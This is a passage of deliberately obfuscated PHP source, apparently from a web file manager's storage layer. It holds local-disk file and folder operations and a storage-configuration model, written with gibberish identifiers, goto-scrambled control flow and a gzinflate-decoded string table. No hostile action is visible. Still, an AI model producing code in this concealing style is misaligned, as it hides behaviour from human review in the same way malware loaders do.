$aÈ¹¶ŸŒÉ[1156] . md5($Bğ‡ô¹Á³); $Bì×„Œ´ˆ£ = Cache::get($dµµ·›ğ¥); goto b«æˆ‡•ïİ; fíåŸßé£: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fÃ­ë¬Š¿) { if (substr($fÃ­ë¬Š¿, 0, 2) == $_SERVER[¨¤¼…´][1145]) { $fÃ­ë¬Š¿ = BASIC_PATH . substr($fÃ­ë¬Š¿, 2); } return $fÃ­ë¬Š¿; } public function iconvApp($DÂ•ÈÙÔó) { $c÷§‹—‡¥ö =& $_SERVER[¨¤¼…´]; global $config; return $this->iconvTo($DÂ•ÈÙÔó, $config[$c÷§‹—‡¥ö[1143]], $config[$c÷§‹—‡¥ö[1142]]); } public function iconvSystem($F‹ğí‚³ÛÜ) { $Føøà»” =& $_SERVER[¨¤¼…´]; global $config; return $this->iconvTo($F‹ğí‚³ÛÜ, $config[$Føøà»”[1142]], $config[$Føøà»”[1143]]); } public function getPathOuter($bƒ¾Ùäôá·) { goto aÇÌØ‹ëºƒ; aÇÌØ‹ëºƒ: $CöéÈŸ¬ô =& $_SERVER[¨¤¼…´]; $dë¦’ê¥â¹ = $this->iconvApp($this->pathBase); $bƒ¾Ùäôá· = $this->iconvApp($bƒ¾Ùäôá·); goto eó­´ƒ‰“ó; A–øŸÁ™Äµ: return $this->pathDriver . $CöéÈŸ¬ô[8] . ltrim($bƒ¾Ùäôá·, $CöéÈŸ¬ô[8]); goto EÆƒ©¥ƒÙ‹; b„™¼ŠÁ: $bƒ¾Ùäôá· = KodIO::clear($bƒ¾Ùäôá·); $bƒ¾Ùäôá· = substr($bƒ¾Ùäôá·, strlen($dë¦’ê¥â¹)); if (empty($this->pathDriver)) { return $bƒ¾Ùäôá·; } goto A–øŸÁ™Äµ; eó­´ƒ‰“ó: if (substr($dë¦’ê¥â¹, 0, 2) == $CöéÈŸ¬ô[1145]) { $dë¦’ê¥â¹ = BASIC_PATH . substr($dë¦’ê¥â¹, 2); } if (substr($bƒ¾Ùäôá·, 0, 2) == $CöéÈŸ¬ô[1145]) { $bƒ¾Ùäôá· = BASIC_PATH . substr($bƒ¾Ùäôá·, 2); } $dë¦’ê¥â¹ = KodIO::clear($dë¦’ê¥â¹); goto b„™¼ŠÁ; EÆƒ©¥ƒÙ‹: } public function mkfile($eÁÊÂÊŸ›, $BšéŠö°µ = '', $dÌ¥ÌŒ¡ˆÎ = REPEAT_RENAME) { $eÁÊÂÊŸ› = $this->iconvSystem($eÁÊÂÊŸ›); @touch($eÁÊÂÊŸ›); if ($BšéŠö°µ) { file_put_contents($eÁÊÂÊŸ›, $BšéŠö°µ); } return is_file($eÁÊÂÊŸ›) ? $this->getPathOuter($eÁÊÂÊŸ›) : !1; } public function mkdir($Eô²—ĞÈ, $EÄÎğš­ƒ = REPEAT_SKIP) { $Eô²—ĞÈ = $this->iconvSystem($Eô²—ĞÈ); if (is_dir($Eô²—ĞÈ)) { return $this->getPathOuter($Eô²—ĞÈ); } @mkdir($Eô²—ĞÈ, 511, !0); return is_dir($Eô²—ĞÈ) ? $this->getPathOuter($Eô²—ĞÈ) : !1; } public function copyFile($fà¯Ù´‹–ˆ, $cá»İ¸øÄ‹) { $this->mkdir($this->pathFather($cá»İ¸øÄ‹)); $fà¯Ù´‹–ˆ = $this->iconvSystem($fà¯Ù´‹–ˆ); $cá»İ¸øÄ‹ = $this->iconvSystem($cá»İ¸øÄ‹); $d†íŒò“À² = copy_64($fà¯Ù´‹–ˆ, $cá»İ¸øÄ‹); return $d†íŒò“À² ? $this->getPathOuter($cá»İ¸øÄ‹) : !1; } public function moveFile($F£„‘Ìáçµ, $d†îê·Á±á) { $this->mkdir($this->pathFather($d†îê·Á±á)); $F£„‘Ìáçµ = $this->iconvSystem($F£„‘Ìáçµ); $d†îê·Á±á = $this->iconvSystem($d†îê·Á±á); $A™ëˆô‡¥ì = intval(@rename($F£„‘Ìáçµ, $d†îê·Á±á)); if (!$A™ëˆô‡¥ì) { if ($A™ëˆô‡¥ì = intval(@copy_64($F£„‘Ìáçµ, $d†îê·Á±á))) { @unlink($F£„‘Ìáçµ); } } return $A™ëˆô‡¥ì ? $this->getPathOuter($d†îê·Á±á) : !1; } public function delFile($Cğ¢ØÖ§©Ş) { $Cğ¢ØÖ§©Ş = $this->iconvSystem($Cğ¢ØÖ§©Ş); if (!@unlink($Cğ¢ØÖ§©Ş)) { @chmod($Cğ¢ØÖ§©Ş, 511); if (!@unlink($Cğ¢ØÖ§©Ş)) { return !1; } } else { return !0; } } public function delFolder($b…”á§¥â) { goto Eø‘¥¢ÀëÂ; Eø‘¥¢ÀëÂ: $cä…¹ù×±Å =& $_SERVER[¨¤¼…´]; $b…”á§¥â = $this->iconvSystem($b…”á§¥â); if (!is_dir($b…”á§¥â)) { return !0; } goto aÖØ‚Ã¸ß; a²«•ª‹Ï: return rmdir($b…”á§¥â); goto d‘´½’“ªñ; aÖØ‚Ã¸ß: if (!($B’…‚ö¬‘« = opendir($b…”á§¥â))) { return !1; } while (($FÚ”ô÷Î×¦ = readdir($B’…‚ö¬‘«)) !== !1) { if ($FÚ”ô÷Î×¦ == $cä…¹ù×±Å[101] || $FÚ”ô÷Î×¦ == $cä…¹ù×±Å[1155]) { continue; } $D±—ÁµÉõâ = $b…”á§¥â . $cä…¹ù×±Å[8] . $FÚ”ô÷Î×¦; if (is_file($D±—ÁµÉõâ) || is_link($D±—ÁµÉõâ)) { if (!unlink($D±—ÁµÉõâ)) { chmod($D±—ÁµÉõâ, 511); if (!unlink($D±—ÁµÉõâ)) { return !1; } } } else { if (is_dir($D±—ÁµÉõâ)) { chmod($D±—ÁµÉõâ, 511); $D±—ÁµÉõâ = $this->iconvApp($D±—ÁµÉõâ); if (!$this->delFolder($D±—ÁµÉõâ)) { return !1; } } } } closedir($B’…‚ö¬‘«); goto a²«•ª‹Ï; d‘´½’“ªñ: } public function rename($b¶ãˆŒœÄ˜, $aÇŒõƒÍ£³) { goto aÂ’ˆØºí; aÂ’ˆØºí: $AÁ¢ß×À® =& $_SERVER[¨¤¼…´]; $C˜ºƒ†™Ø = $this->fileNameAuto($this->pathFather($b¶ãˆŒœÄ˜), $aÇŒõƒÍ£³); $C˜ºƒ†™Ø = $this->iconvSystem($C˜ºƒ†™Ø); goto ağÊ’ ÌæŸ; b™ºò—æİ: $Dˆ©İÅƒ† = @rename($b¶ãˆŒœÄ˜, $bÛÃ´ÒÌÈƒ); $bÛÃ´ÒÌÈƒ = $this->iconvApp($bÛÃ´ÒÌÈƒ); return $Dˆ©İÅƒ† ? $this->getPathOuter($bÛÃ´ÒÌÈƒ) : !1; goto Dœ”ùà²¦ò; ağÊ’ ÌæŸ: $b¶ãˆŒœÄ˜ = $this->iconvSystem($b¶ãˆŒœÄ˜); $fÙÙÑíšŞ” = $this->pathFather($b¶ãˆŒœÄ˜); $bÛÃ´ÒÌÈƒ = rtrim($fÙÙÑíšŞ”, $AÁ¢ß×À®[8]) . $AÁ¢ß×À®[8] . $C˜ºƒ†™Ø; goto b™ºò—æİ; Dœ”ùà²¦ò: } public function size($f„¢éìã¤) { $f„¢éìã¤ = $this->iconvSystem($f„¢éìã¤); return filesize_64($f„¢éìã¤); } public function info($Cğ¬ÀˆÆÊ·) { $Cğ¬ÀˆÆÊ· = $this->iconvSystem($Cğ¬ÀˆÆÊ·); if ($this->isFolder($Cğ¬ÀˆÆÊ·)) { return $this->folderInfo($Cğ¬ÀˆÆÊ·); } else { if ($this->isFile($Cğ¬ÀˆÆÊ·)) { return $this->fileInfo($Cğ¬ÀˆÆÊ·); } } return !1; } protected function infoChildren($EÑ¦“…¨Üö, &$a³¡õñ¿¼×, $e‡ÀöÓ–Ö¹ = true) { goto D†£»ìÁ ; D†£»ìÁ : $bëÍù˜ÄŸ§ =& $_SERVER[¨¤¼…´]; check_abort(); $EÑ¦“…¨Üö = rtrim($EÑ¦“…¨Üö, $bëÍù˜ÄŸ§[8]) . $bëÍù˜ÄŸ§[8]; goto f·…İÃ¯Ø; f·…İÃ¯Ø: if ($e‡ÀöÓ–Ö¹) { $EÑ¦“…¨Üö = $this->iconvSystem($EÑ¦“…¨Üö); } if (!($a¢£®¡¨É» = @opendir($EÑ¦“…¨Üö))) { return; } while (($D“Êœœ´÷– = readdir($a¢£®¡¨É»)) !== !1) { if ($D“Êœœ´÷– == $bëÍù˜ÄŸ§[101] || $D“Êœœ´÷– == $bëÍù˜ÄŸ§[1155]) { continue; } $DÚóÄò÷îÇ = $EÑ¦“…¨Üö . $D“Êœœ´÷–; if (is_file($DÚóÄò÷îÇ) || is_link($DÚóÄò÷îÇ)) { $a³¡õñ¿¼×[$bëÍù˜ÄŸ§[88]]++; $a³¡õñ¿¼×[$bëÍù˜ÄŸ§[87]] += filesize_64($DÚóÄò÷îÇ); } else { if (is_dir($DÚóÄò÷îÇ)) { $a³¡õñ¿¼×[$bëÍù˜ÄŸ§[89]]++; $this->infoChildren($DÚóÄò÷îÇ, $a³¡õñ¿¼×, !1); } } } goto E‚¯Èæ…¼; E‚¯Èæ…¼: closedir($a¢£®¡¨É»); goto Dé’‡¿ì¤Ã; Dé’‡¿ì¤Ã: } private function folderInfo($b…Œİ‘¢¤, $D™Œ¨¿…İò = false) { $CªùŸ³àË =& $_SERVER[¨¤¼…´]; $b…Œİ‘¢¤ = rtrim($b…Œİ‘¢¤, $CªùŸ³àË[8]) . $CªùŸ³àË[8]; $F‚®“­ = $this->iconvApp($this->pathThis($b…Œİ‘¢¤)); if ($D™Œ¨¿…İò) { return array($CªùŸ³àË[38] => $F‚®“­, $CªùŸ³àË[85] => $this->getPathOuter($b…Œİ‘¢¤), $CªùŸ³àË[39] => $CªùŸ³àË[86]); } $FÍ¥Ê–­«  = array($CªùŸ³àË[38] => $F‚®“­, $CªùŸ³àË[85] => $this->getPathOuter($b…Œİ‘¢¤), $CªùŸ³àË[39] => $CªùŸ³àË[86], $CªùŸ³àË[201] => @filectime($b…Œİ‘¢¤), $CªùŸ³àË[117] => @filemtime($b…Œİ‘¢¤), $CªùŸ³àË[1157] => @fileatime($b…Œİ‘¢¤), $CªùŸ³àË[1152] => is_readable($b…Œİ‘¢¤), $CªùŸ³àË[1153] => is_writable($b…Œİ‘¢¤), $CªùŸ³àË[1158] => get_mode($b…Œİ‘¢¤)); return $FÍ¥Ê–­« ; } private function fileInfo($b¼ß§„›ğ‚, $B¸•òÈìÙ = false) { $AÈº­íŸ½à =& $_SERVER[¨¤¼…´]; $d™øÈ±²Ê¦ = $this->iconvApp($this->pathThis($b¼ß§„›ğ‚)); if ($B¸•òÈìÙ) { return array($AÈº­íŸ½à[38] => $d™øÈ±²Ê¦, $AÈº­íŸ½à[85] => $this->getPathOuter($b¼ß§„›ğ‚), $AÈº­íŸ½à[39] => $AÈº­íŸ½à[181], $AÈº­íŸ½à[87] => $this->size($b¼ß§„›ğ‚), $AÈº­íŸ½à[175] => $this->ext($d™øÈ±²Ê¦)); } $cë´êÃëÏ = array($AÈº­íŸ½à[38] => $d™øÈ±²Ê¦, $AÈº­íŸ½à[85] => $this->getPathOuter($b¼ß§„›ğ‚), $AÈº­íŸ½à[39] => $AÈº­íŸ½à[181], $AÈº­íŸ½à[201] => @filectime($b¼ß§„›ğ‚), $AÈº­íŸ½à[117] => @filemtime($b¼ß§„›ğ‚), $AÈº­íŸ½à[1157] => @fileatime($b¼ß§„›ğ‚), $AÈº­íŸ½à[87] => $this->size($b¼ß§„›ğ‚), $AÈº­íŸ½à[175] => $this->ext($d™øÈ±²Ê¦), $AÈº­íŸ½à[1152] => is_readable($b¼ß§„›ğ‚), $AÈº­íŸ½à[1153] => is_writable($b¼ß§„›ğ‚), $AÈº­íŸ½à[1158] => get_mode($b¼ß§„›ğ‚)); return $cë´êÃëÏ; } public function exist($bÇàÒºóõ) { $bÇàÒºóõ = $this->iconvSystem($bÇàÒºóõ); return @file_exists($bÇàÒºóõ); } public function isFile($E®›éÀê—±) { $E®›éÀê—± = $this->iconvSystem($E®›éÀê—±); return @is_file($E®›éÀê—±); } public function isFolder($FµË¡Îíå¡) { $FµË¡Îíå¡ = $this->iconvSystem($FµË¡Îíå¡); return @is_dir($FµË¡Îíå¡); } public function listPath($dËÏ·òœƒÖ, $f£¿ÌÇÎğ = false) { goto Cê°··‚ß; F´½»¤ÅŸÆ: $d§é—¥¥Œ÷ = array($c°‰µ™×Ùì[84] => array(), $c°‰µ™×Ùì[83] => array()); if (!($a‰ãª· = @opendir($dËÏ·òœƒÖ))) { return $d§é—¥¥Œ÷; } while (($aê‚Áâ¼Ÿ = readdir($a‰ãª·)) !== !1) { if ($aê‚Áâ¼Ÿ == $c°‰µ™×Ùì[101] || $aê‚Áâ¼Ÿ == $c°‰µ™×Ùì[1155]) { continue; } $dºò‡Ö¹” = $dËÏ·òœƒÖ . $aê‚Áâ¼Ÿ; if (is_file($dºò‡Ö¹”)) { $d§é—¥¥Œ÷[$c°‰µ™×Ùì[83]][] = $this->fileInfo($dºò‡Ö¹”, $f£¿ÌÇÎğ); } else { $d§é—¥¥Œ÷[$c°‰µ™×Ùì[84]][] = $this->folderInfo($dºò‡Ö¹”, $f£¿ÌÇÎğ); } } goto dÕ¹ŠÔÏŠ; Cê°··‚ß: $c°‰µ™×Ùì =& $_SERVER[¨¤¼…´]; $dËÏ·òœƒÖ = $this->iconvSystem($dËÏ·òœƒÖ); $dËÏ·òœƒÖ = rtrim($dËÏ·òœƒÖ, $c°‰µ™×Ùì[8]) . $c°‰µ™×Ùì[8]; goto F´½»¤ÅŸÆ; dÕ¹ŠÔÏŠ: closedir($a‰ãª·); return $d§é—¥¥Œ÷; goto b´Ñíƒ ×©; b´Ñíƒ ×©: } public function listAll($eå¡¼ìéÕÅ, &$FÊ¥õ‡ºÆ = array()) { goto dâ¤Ñğ²Ó; bÅ°¾Ú’ì§: return $FÊ¥õ‡ºÆ; goto c„ÍŠã÷—; dâ¤Ñğ²Ó: $fØªù’»ê =& $_SERVER[¨¤¼…´]; $eå¡¼ìéÕÅ = $this->iconvSystem($eå¡¼ìéÕÅ); $eå¡¼ìéÕÅ = rtrim($eå¡¼ìéÕÅ, $fØªù’»ê[8]) . $fØªù’»ê[8]; goto f”»Ğ‡¤ö; f”»Ğ‡¤ö: if (!($fÕ¨•šäá = @opendir($eå¡¼ìéÕÅ))) { return $FÊ¥õ‡ºÆ; } while (($ešÚÖ°¹à = readdir($fÕ¨•šäá)) !== !1) { if ($ešÚÖ°¹à == $fØªù’»ê[101] || $ešÚÖ°¹à == $fØªù’»ê[1155]) { continue; } $e‡Ëâ­¬ = $eå¡¼ìéÕÅ . $ešÚÖ°¹à; if (is_dir($e‡Ëâ­¬) && !is_link($e‡Ëâ­¬)) { $FÊ¥õ‡ºÆ[] = array($fØªù’»ê[85] => $e‡Ëâ­¬ . $fØªù’»ê[8], $fØªù’»ê[86] => 1, $fØªù’»ê[117] => @filemtime($e‡Ëâ­¬), $fØªù’»ê[87] => 0); $this->listAll($e‡Ëâ­¬, $FÊ¥õ‡ºÆ); } else { $FÊ¥õ‡ºÆ[] = array($fØªù’»ê[85] => $e‡Ëâ­¬, $fØªù’»ê[86] => 0, $fØªù’»ê[117] => @filemtime($e‡Ëâ­¬), $fØªù’»ê[87] => $this->size($e‡Ëâ­¬)); } } closedir($fÕ¨•šäá); goto bÅ°¾Ú’ì§; c„ÍŠã÷—: } public function has($A¥°ÎŒƒŠ„, $a†É•ÈÌô¯ = false, $eöéì½ƒŠä = true) { goto DÂ¯–ññÖ; BÊñù–ÑÜù: if ($a†É•ÈÌô¯) { return array($BÖŒºÒ°Ì [205] => $BÆí‚«ÍíÎ, $BÖŒºÒ°Ì [206] => $a‹²ºäŸ¿É); } return !1; goto AÚ³Ñºƒ†; BÕ˜–Ö£ì‚: $B¥›‹¸¦Í = 0; while (($AÀá£‰¨‹ = readdir($a‚„Ï”ó™ñ)) !== !1) { if ($AÀá£‰¨‹ == $BÖŒºÒ°Ì [101] || $AÀá£‰¨‹ == $BÖŒºÒ°Ì [1155]) { continue; } $CÏ‰¨°Ö¡ê = $A¥°ÎŒƒŠ„ . $AÀá£‰¨‹; if ($a†É•ÈÌô¯) { $B¥›‹¸¦Í++; if (@is_file($CÏ‰¨°Ö¡ê)) { $BÆí‚«ÍíÎ++; } else { $a‹²ºäŸ¿É++; } if ($B¥›‹¸¦Í > 10000) { break; } continue; } if ($eöéì½ƒŠä) { if (@is_file($CÏ‰¨°Ö¡ê)) { return !0; } } else { if (@is_dir($CÏ‰¨°Ö¡ê . $BÖŒºÒ°Ì [8])) { return !0; } } } closedir($a‚„Ï”ó™ñ); goto BÊñù–ÑÜù; DÂ¯–ññÖ: $BÖŒºÒ°Ì  =& $_SERVER[¨¤¼…´]; $A¥°ÎŒƒŠ„ = $this->iconvSystem($A¥°ÎŒƒŠ„); $A¥°ÎŒƒŠ„ = rtrim($A¥°ÎŒƒŠ„, $BÖŒºÒ°Ì [8]) . $BÖŒºÒ°Ì [8]; goto eÌèæÇÃÔÑ; eÌèæÇÃÔÑ: if (!($a‚„Ï”ó™ñ = @opendir($A¥°ÎŒƒŠ„))) { return !1; } $BÆí‚«ÍíÎ = 0; $a‹²ºäŸ¿É = 0; goto BÕ˜–Ö£ì‚; AÚ³Ñºƒ†: } public function hashSimple($f…Ø…¼ô¯Î) { goto a…Òéê›Æ; e‡ÔÇÁİõ: fseek_64($eßä£É“†£, $EøÀäàãƒ - $c­çà×ËŠ); $FË†¿¡ï·„ .= fread($eßä£É“†£, $c­çà×ËŠ); fclose($eßä£É“†£); goto A¹Ÿ‘ó¶ä¶; A¹Ÿ‘ó¶ä¶: return md5($FË†¿¡ï·„) . $EøÀäàãƒ; goto F ­ÙË’è; a…Òéê›Æ: $f´”¿‚Ø° =& $_SERVER[¨¤¼…´]; if (!$f…Ø…¼ô¯Î) { return md5($f´”¿‚Ø°[43]); } $f…Ø…¼ô¯Î = $this->iconvSystem($f…Ø…¼ô¯Î); goto C¥¢«‚‚Û; F°ÒŞìËÜ›: $eßä£É“†£ = fopen($f…Ø…¼ô¯Î, $f´”¿‚Ø°[1159]); if (!$eßä£É“†£) { return $FË†¿¡ï·„; } for ($Aİ¯¶¿Ç¼ = 0; $Aİ¯¶¿Ç¼ < $bêŸ¤›º‰ï; $Aİ¯¶¿Ç¼++) { fseek_64($eßä£É“†£, $FİÆ¹§ª¨Ê * $Aİ¯¶¿Ç¼); $FË†¿¡ï·„ .= fread($eßä£É“†£, $c­çà×ËŠ); } goto e‡ÔÇÁİõ; C¥¢«‚‚Û: $EøÀäàãƒ = $this->size($f…Ø…¼ô¯Î); $c­çà×ËŠ = 200; $bêŸ¤›º‰ï = 50; goto d³Ã¤×µõ÷; d³Ã¤×µõ÷: if ($EøÀäàãƒ <= $c­çà×ËŠ * $bêŸ¤›º‰ï) { return $this->hashMd5($f…Ø…¼ô¯Î) . $EøÀäàãƒ; } $FË†¿¡ï·„ = $f´”¿‚Ø°[43]; $FİÆ¹§ª¨Ê = intval($EøÀäàãƒ / $bêŸ¤›º‰ï); goto F°ÒŞìËÜ›; F ­ÙË’è: } public function getContent($cßŞï‚“ÅÌ) { $cßŞï‚“ÅÌ = $this->iconvSystem($cßŞï‚“ÅÌ); return file_get_contents($cßŞï‚“ÅÌ); } public function setContent($f ‰ˆÏìŞ¤, $Aµ”Œê“ = '') { $f ‰ˆÏìŞ¤ = $this->iconvSystem($f ‰ˆÏìŞ¤); @file_put_contents($f ‰ˆÏìŞ¤, $Aµ”Œê“, LOCK_EX); clearstatcache(); return strlen($Aµ”Œê“) == filesize_64($f ‰ˆÏìŞ¤); } public function fileSubstr($Cª¤¦æİ‡, $BßÓàÈÔ‚ = 0, $A¼Çá†È›ƒ = false) { goto e¦©ÀÚ›º; e¦©ÀÚ›º: $Aä‰Ì¸««‘ =& $_SERVER[¨¤¼…´]; $Cª¤¦æİ‡ = $this->iconvSystem($Cª¤¦æİ‡); if ($A¼Çá†È›ƒ === !1) { $A¼Çá†È›ƒ = $this->size($Cª¤¦æİ‡); } goto E‘é”–È; cİ‹«‚ÊŠ: fseek_64($c˜³áÓ¶Ÿ•, $BßÓàÈÔ‚); $AŠÍØŠ¡öŠ = fread($c˜³áÓ¶Ÿ•, $A¼Çá†È›ƒ); fclose($c˜³áÓ¶Ÿ•); goto Câƒ²¿¥Ì‚; E‘é”–È: if ($A¼Çá†È›ƒ <= 0) { return $Aä‰Ì¸««‘[43]; } $c˜³áÓ¶Ÿ• = fopen($Cª¤¦æİ‡, $Aä‰Ì¸««‘[1159]); if (!$c˜³áÓ¶Ÿ•) { return !1; } goto cİ‹«‚ÊŠ; Câƒ²¿¥Ì‚: return $AŠÍØŠ¡öŠ; goto aÌİ‰İìÅ; aÌİ‰İìÅ: } public function upload($b¡á£½ŒØÁ, $E‡Ò¸ˆŸÊù, $bÔ¬ˆ•¹µ = false, $a¬ìˆÔëŒ× = REPEAT_REPLACE) { $fŒâ‘Òóñó = $this->copyFile($E‡Ò¸ˆŸÊù, $b¡á£½ŒØÁ); return $fŒâ‘Òóñó ? $this->getPathOuter($b¡á£½ŒØÁ) : !1; } public function setModifyTime($e¿ì®¥ì³Ÿ, $bÏøÍÖøÌŒ = '') { @touch($e¿ì®¥ì³Ÿ, intval($bÏøÍÖøÌŒ)); } public function download($eæ¡®Ò¢…ç, $A˜ÀöÊÉë§) { return $this->iconvSystem($eæ¡®Ò¢…ç); } } goto F¨­¿­‚ùĞ; F¾ÊÛˆæç: define($_SERVER[¨¤¼…´][0], $_SERVER[¨¤¼…´][1]); $_SERVER[ë‹ºñÌ†‡] = explode($_SERVER[¨¤¼…´][2], gzinflate(substr($_SERVER[¨¤¼…´][3], 10, -8))); function Model($bÍ»Ğõñ£¼ = '', $f­¬‹ª„„ = '', $DÆŸ»†¿ç = '') { goto e¸¸‹·õË; A¹ŒëĞêÑœ: if (isset($CÏííÔë™[$d•Åæå†µ])) { return $CÏííÔë™[$d•Åæå†µ]; } if ($bÍ»Ğõñ£¼) { $bÍ»Ğõñ£¼ = strtoupper($bÍ»Ğõñ£¼[0]) . substr($bÍ»Ğõñ£¼, 1); $f»¼Ô¥ï—İ = $bÍ»Ğõñ£¼ . $CĞ­¾ˆ‡¿[1]; if (class_exists($f»¼Ô¥ï—İ)) { $CÏííÔë™[$d•Åæå†µ] = new $f»¼Ô¥ï—İ(); return $CÏííÔë™[$d•Åæå†µ]; } } if (!$DÆŸ»†¿ç) { $DÆŸ»†¿ç = $GLOBALS[$CĞ­¾ˆ‡¿[2]][$CĞ­¾ˆ‡¿[3]]; } goto eˆèæèğ†; eˆèæèğ†: $CÏííÔë™[$d•Åæå†µ] = new ModelBase($bÍ»Ğõñ£¼, $f­¬‹ª„„, $DÆŸ»†¿ç); return $CÏííÔë™[$d•Åæå†µ]; goto E¬½†Şòà; e¸¸‹·õË: $CĞ­¾ˆ‡¿ =& $_SERVER[ë‹ºñÌ†‡]; static $CÏííÔë™ = array(); $d•Åæå†µ = strtolower($f­¬‹ª„„ . $CĞ­¾ˆ‡¿[0] . $bÍ»Ğõñ£¼); goto A¹ŒëĞêÑœ; E¬½†Şòà: } goto A¶Ò™‚‚’; d¦£¦°‹„Î: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\x73\x74\x6f\x72\x61\x67\x65\114\x69\163\164"; public $field = array("\156\x61\155\145", "\x73\x69\172\145\x4d\141\170", "\x73\171\x73\164\145\155", "\144\x65\x66\141\165\x6c\164", "\x64\162\151\166\x65\162", "\x63\157\x6e\146\x69\x67"); public function listData($C¡àøÕ¯Ã = false, $CÒéêÏÓï­ = "\x6d\157\144\x69\146\171\x54\x69\155\x65", $fĞŸ†İµ = false) { goto dŞŠ”³²Ü•; fîñŞ¬¡¿µ: foreach ($Ašåò„¯ˆ¿ as $a°†Ü†ÓÀÅ => $CÒÂªÅÇí) { unset($Ašåò„¯ˆ¿[$a°†Ü†ÓÀÅ][$cõ»Ù Œ‰Ó[6]]); $Ašåò„¯ˆ¿[$a°†Ü†ÓÀÅ][$cõ»Ù Œ‰Ó[2081]] = 0; } $Eâğ×•›…¹ = array_to_keyvalue($Ašåò„¯ˆ¿, $cõ»Ù Œ‰Ó[43], $cõ»Ù Œ‰Ó[379]); $this->_listAppendSize($Ašåò„¯ˆ¿, $Eâğ×•›…¹); goto Eç‡ˆíÖÑÌ; Eç‡ˆíÖÑÌ: return $Ašåò„¯ˆ¿; goto dËå¥á‰‚²; dŞŠ”³²Ü•: $cõ»Ù Œ‰Ó =& $_SERVER[¨¤¼…´]; $Ašåò„¯ˆ¿ = parent::listData($C¡àøÕ¯Ã, $CÒéêÏÓï­, $fĞŸ†İµ); if ($C¡àøÕ¯Ã) { return $Ašåò„¯ˆ¿; } goto fîñŞ¬¡¿µ; dËå¥á‰‚²: } public function _listAppendSize(&$e•ÀÃÇ¸‘Ø, $f¢™÷¯ŸÊª) { $Bõ³Òšœ =& $_SERVER[¨¤¼…´]; if (!$f¢™÷¯ŸÊª) { return; } $bÁÀ…Öñ³ï = $Bõ³Òšœ[2384] . implode($Bõ³Òšœ[57], $f¢™÷¯ŸÊª) . $Bõ³Òšœ[2385]; $fŒ‘•Ú´„ = Model($Bõ³Òšœ[708])->query($bÁÀ…Öñ³ï); $fŒ‘•Ú´„ = array_to_keyvalue($fŒ‘•Ú´„, $Bõ³Òšœ[379], $Bõ³Òšœ[87]); foreach ($e•ÀÃÇ¸‘Ø as $a›ŠÀĞ³‘˜ => $CÖñ‰½¨ÜÚ) { $e•ÀÃÇ¸‘Ø[$a›ŠÀĞ³‘˜][$Bõ³Òšœ[2081]] = isset($fŒ‘•Ú´„[$CÖñ‰½¨ÜÚ[$Bõ³Òšœ[379]]]) ? $fŒ‘•Ú´„[$CÖñ‰½¨ÜÚ[$Bõ³Òšœ[379]]] : 0; } } public function getConfig($B¬ÊÚ˜”»‹) { $BÃ†àæĞ¦Š = parent::listData($B¬ÊÚ˜”»‹); return json_decode($BÃ†àæĞ¦Š[$_SERVER[¨¤¼…´][6]], !0); } public function update($f‚õ½®®‚³, $d£¸˜Ç‘¥º) { goto bâö ùÇÓÀ; DÜ£ÁŞ¿³´: $Fì˜š—Óğç = parent::update($f‚õ½®®‚³, $d£¸˜Ç‘¥º); if ($Fì˜š—Óğç && $d£¸˜Ç‘¥º[$D…Ğì«²ĞŞ[44]]) { foreach ($d—¡ñÆ®¨’ as $f§à¼â‚Æá) { if ($f§à¼â‚Æá[$D…Ğì«²ĞŞ[44]] && $f§à¼â‚Æá[$D…Ğì«²ĞŞ[379]] != $f‚õ½®®‚³) { parent::update($f§à¼â‚Æá[$D…Ğì«²ĞŞ[379]], array($D…Ğì«²ĞŞ[44] => 0)); } } } return $Fì˜š—Óğç; goto eË¡£ªš; bë§·ÚĞ›Å: if (isset($d—¡ñÆ®¨’[$bÒ“Âñ•Òò]) && $d—¡ñÆ®¨’[$bÒ“Âñ•Òò][$D…Ğì«²ĞŞ[379]] != $f‚õ½®®‚³) { return !1; } if (isset($d£¸˜Ç‘¥º[$D…Ğì«²ĞŞ[2386]]) && $d£¸˜Ç‘¥º[$D…Ğì«²ĞŞ[2386]] == $D…Ğì«²ĞŞ[93]) { $this->checkConfig($d£¸˜Ç‘¥º); } unset($d£¸˜Ç‘¥º[$D…Ğì«²ĞŞ[2386]]); goto DÜ£ÁŞ¿³´; bâö ùÇÓÀ: $D…Ğì«²ĞŞ =& $_SERVER[¨¤¼…´]; $bÒ“Âñ•Òò = $d£¸˜Ç‘¥º[$D…Ğì«²ĞŞ[38]]; $d—¡ñÆ®¨’ = array_to_keyvalue(parent::listData(), $D…Ğì«²ĞŞ[38]); goto bë§·ÚĞ›Å; eË¡£ªš: } public function add($F—Òîİ…¿“) { goto EÍ¸×–°”; cÏ½ÖİÎµè: $this->checkConfig($F—Òîİ…¿“); $A˜º˜”õé = parent::insert($F—Òîİ…¿“); if ($A˜º˜”õé && $F—Òîİ…¿“[$F‹†‰ºĞöç[44]]) { foreach ($fßÌŞÔç©Æ as $BÓì»›ì) { if ($BÓì»›ì[$F‹†‰ºĞöç[44]]) { parent::update($BÓì»›ì[$F‹†‰ºĞöç[379]], array($F‹†‰ºĞöç[44] => 0)); } } } goto b‘’øÌçÓ; b‘’øÌçÓ: return $A˜º˜”õé; goto c›÷Ï¦–ó; EÍ¸×–°”: $F‹†‰ºĞöç =& $_SERVER[¨¤¼…´]; $fßÌŞÔç©Æ = array_to_keyvalue(parent::listData(), $F‹†‰ºĞöç[38]); if (isset($fßÌŞÔç©Æ[$F—Òîİ…¿“[$F‹†‰ºĞöç[38]]])) { return !1; } goto cÏ½ÖİÎµè; c›÷Ï¦–ó: } public function checkConfig(&$f†¿À‡Ëİø) { goto a·–Ê®œ‡É; b§¹“ËìğÄ: $AâëÄœçø = new $A…«½ÛÎ£è($E·çêÅª‰); if (in_array($eÈóÃĞ…¥ä, $AâëÄœçø->objectDriver)) { if (!$AâëÄœçø->isBucketCors() && !$AâëÄœçø->setBucketCors()) { $cŞÊ²ìááÛ = LNG($Eßš½óÀ¯[2391]); $cŞÊ²ìááÛ .= $Eßš½óÀ¯[2392] . LNG($Eßš½óÀ¯[2393]); show_json($cŞÊ²ìááÛ, !1); } } $DÕ˜ƒ¶ÕØ = rtrim($E·çêÅª‰[$Eßš½óÀ¯[1015]], $Eßš½óÀ¯[8]) . $Eßš½óÀ¯[8]; goto dïÚœËŒÑ; DªÕ¦àØ‡è: foreach ($E·çêÅª‰ as $aŠÊŠ£”±ô => $eŒ«Ó¬ÂÃ) { $E·çêÅª‰[$aŠÊŠ£”±ô] = 